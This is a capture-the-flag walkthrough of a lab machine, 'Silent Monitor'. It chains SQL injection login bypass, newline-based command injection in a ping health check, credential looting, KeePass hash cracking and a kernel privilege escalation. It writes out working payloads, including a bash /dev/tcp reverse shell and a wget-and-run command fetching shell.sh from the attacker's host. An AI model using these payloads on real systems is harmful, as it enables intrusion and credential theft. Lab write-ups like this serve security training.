# Silent Monitor

---

## Initial Enumeration

As always, we start with some basic enumeration.

```bash
nmap -sV -sC 10.130.144.204
```

![](images/Pasted%20image%2020260730160905.png)

The scan reveals a web application running on **port 5050**, served by **Werkzeug**.

Heading over to the website:

![](images/Pasted%20image%2020260730160743.png)

The first thing that catches the eye is the footer showing **NOC Portal v2.4.1**.

Naturally, the first instinct is to search whether this version has any known vulnerabilities, but a quick Google search doesn't reveal anything useful.

No worries, let's continue enumerating.

After some directory busting, we discover an interesting endpoint:

![](images/Pasted%20image%2020260730160947.png)

Browsing to **/internal** presents us with a login page.

![](images/Pasted%20image%2020260730161111.png)

---

## Bypassing Authentication

The login form is vulnerable to **SQL Injection**. Entering the following payload as the **username** (with any password):

```
' OR 1=1;--
```

allows us to bypass authentication. The payload makes the SQL query always evaluate as **true**, while `--` comments out the rest of the query, effectively ignoring the password check and logging us in as a valid user.

![](images/Pasted%20image%2020260730161423.png)

Just like that, we're authenticated as **netops**.

After spending a few minutes exploring the dashboard, we stumble upon what turns out to be the most interesting functionality on the site.

![](images/Pasted%20image%2020260730161604.png)

The **Host Health Check** feature allows us to test the connectivity of arbitrary hosts.

As always...

It's Burp Suite time.

![](images/Pasted%20image%2020260730161855.png)

---

## Command Injection

Intercepting the request shows that the supplied IP address is sent as the value of the **`target`** parameter.

If that value is passed directly to a system command without proper sanitization, we may be able to inject our own commands.

Even better, the application conveniently prints the command it executes, together with its output.

![](images/Pasted%20image%2020260730162133.png)

The backend appears to execute:

```text
ping -c 2 -w 1 <TARGET>
```

Before blindly throwing reverse shells at it, it's usually better to understand how the application processes our input.

Looking at the HTML source doesn't reveal any client-side filtering either.

![](images/Pasted%20image%2020260730162456.png)

This input field is simply a regular text box.
There are no JavaScript filters, regex validations, or allowlists restricting what can be submitted.
Of course, client-side validation should never be trusted anyway since Burp Suite allows us to modify requests before they ever reach the server.

Our first attempt is the classic command separator using a semicolon.

![](images/Pasted%20image%2020260730162730.png)

![](images/Pasted%20image%2020260730162938.png)

Unfortunately, that doesn't work.

Instead of giving up, we try another common trick.

Since the backend is likely executing the command through a shell, we replace the semicolon with a **newline**, encoded as:

```
%0a
```

(**`;`** would be encoded as **`%3B`**.)

![](images/Pasted%20image%2020260730163149.png)

![](images/Pasted%20image%2020260730163207.png)

Success!

The injected **id** command is executed.

This tells us that while semicolons are somehow filtered or escaped, newline characters are still interpreted by the shell as command separators.

Now all that's left is obtaining a reverse shell.

A straightforward payload would be:

```bash
127.0.0.1%0abash -c 'bash -i >%26 /dev/tcp/YOUR_IP/PORT 0>%261'
```

![](images/Pasted%20image%2020260730163532.png)

Unfortunately, this one doesn't work.

Rather than spending time trying different reverse shell one-liners, we can host our own script, download it to the target, and execute it.

First, create the script locally.

```bash
#if u made the command in one line i will not work!
echo '#!/bin/bash 
bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1' > shell.sh
```

Start a listener.

```bash
nc -lvnp 4444
```

![](images/Pasted%20image%2020260730163843.png)

And host the script with a Python web server.

```bash
python3 -m http.server #u can specify ur port here or just leave it default(8000)
```

![](images/Pasted%20image%2020260730163944.png)

Finally, replace the **target** parameter with:

```bash
127.0.0.1%0awget http://YOUR_IP:8000/shell.sh -O /tmp/shell.sh%0abash /tmp/shell.sh
```

> **Note:** If you chose a different port for the Python server, remember to update the command accordingly.

![](images/Pasted%20image%2020260730164658.png)

Mission accomplished.

Reverse shell obtained.

To make it a little more interactive:

```bash
script /dev/null -c bash

# then Hit Enter and Ctrl+Z after, and when it exits to ur shell type:
stty raw -echo;fg 
# and hit Enter
```

---

## Lateral Movement

Now that we have a shell, the first thing worth checking is the current directory.

```bash
ls -la

cat secret.config
```

![](images/Pasted%20image%2020260730165410.png)

Nice.
We immediately recover credentials.

Checking `/etc/passwd` confirms that a user named **sysadmin** exists, and from our initial Nmap scan we already know that **SSH** is enabled.

```bash
cat /etc/passwd | grep home
```

![](images/Pasted%20image%2020260730165824.png)

Trying to switch users directly with **su** doesn't work.

![](images/Pasted%20image%2020260730165911.png)

Instead, we authenticate through SSH.

```bash
ssh sysadmin@MACHINE_IP
```

![](images/Pasted%20image%2020260730170028.png)

This time it works perfectly.
User flag is retrieved!

![](images/Pasted%20image%2020260730170151.png)

---

## Privilege Escalation

While browsing **sysadmin**'s home directory, one folder immediately grabs our attention.

**backups**

![](images/Pasted%20image%2020260730170510.png)

Inside it sits a **KeePass credential database**.

Rather than interacting with it on the target, it's much easier to download it and analyze it locally.

```bash
#on the lab machine
python3 -m http.server

#on our machine
wget http://MACHINE_IP:8000/infrastructure.kdbx
```

![](images/Pasted%20image%2020260730170751.png)

We first extract its password hash.

```bash
keepass2john infrastructure.kdbx > kdbx.hash

#and then we BF the password
john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
```

![](images/Pasted%20image%2020260730183357.png)

The password turns out to be fairly weak and is quickly cracked.

Now we simply open the database using **KeePassXC**.

![](images/Pasted%20image%2020260730183922.png)

> **Note:** If you don't already have it installed:

```bash
sudo apt install keepassxc
```


Inside the database we discover the **root** credentials.

![](images/Pasted%20image%2020260730184216.png)

Switching users is now trivial.

![](images/Pasted%20image%2020260730184157.png)

Root flag retrieved.

---

## Alternative Privilege Escalation

Interestingly, there was another path to root.

Once we obtained the **sysadmin** account, checking the kernel version reveals that the system is vulnerable to the recently disclosed **Copy Fail (CVE-2026-31431)**.

> **Note:** This wouldn't have worked from the original **www-data** shell because the exploit specifically requires a user whose UID contains four digits.

```bash
cat /proc/version
```

![](images/Pasted%20image%2020260730175129.png)

The exploit can be found here:

https://github.com/iss4cf0ng/CVE-2026-31431-Linux-Copy-Fail

Following the README is straightforward.

Host the exploit:

```bash
#On our machine
python3 -m http.server
```

Then download it on the target.

```bash
#On the Lab machine
wget http://YOUR_IP:8000/CVE-2026-31431-Linux-Copy-Fail_x86
```

After making it executable and running it, we obtain a root shell.

![](images/Pasted%20image%2020260730185138.png)

---

## Conclusion

I really enjoyed this room. It chains together several realistic issues instead of relying on a single vulnerability: an SQL Injection to bypass authentication, a command injection leading to remote code execution, weak credential management through an exposed KeePass database, and even an alternative kernel privilege escalation via **Copy Fail**.
I also liked that it encouraged trying different payloads instead of assuming the first one would work. 
Overall, it was a fun room that rewarded good enumeration and a bit of persistence.

**— 0xchnk**
